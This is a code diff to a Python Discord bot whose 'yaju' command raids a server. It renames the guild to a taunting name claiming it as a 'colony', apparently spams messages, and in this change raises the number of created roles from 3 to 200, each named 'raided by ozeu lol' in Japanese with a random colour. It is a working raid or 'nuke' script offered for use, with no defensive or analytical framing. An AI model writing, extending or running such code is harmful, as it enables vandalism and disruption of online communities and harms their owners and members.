@@ -20,7 +20,7 @@ async def yaju(ctx):
     await ctx.send("処理を開始します...")
 
     try:
-        await guild.edit(name="おぜうの集い")
+        await guild.edit(name="#おぜうの集い植民地")
     except Exception as e:
         print(f"サーバー名変更失敗: {e}")
 
@@ -48,9 +48,9 @@ async def yaju(ctx):
             print(f"メッセージ送信エラー: {r}")
 
     role_tasks = []
-    for i in range(3):
+    for i in range(200):
         color = discord.Color(random.randint(0, 0xFFFFFF))
-        role_tasks.append(guild.create_role(name="ozeuによって", color=color))
+        role_tasks.append(guild.create_role(name="ozeuによって荒らされましたww", color=color))
     results = await asyncio.gather(*role_tasks, return_exceptions=True)
     for r in results:
         if isinstance(r, Exception):
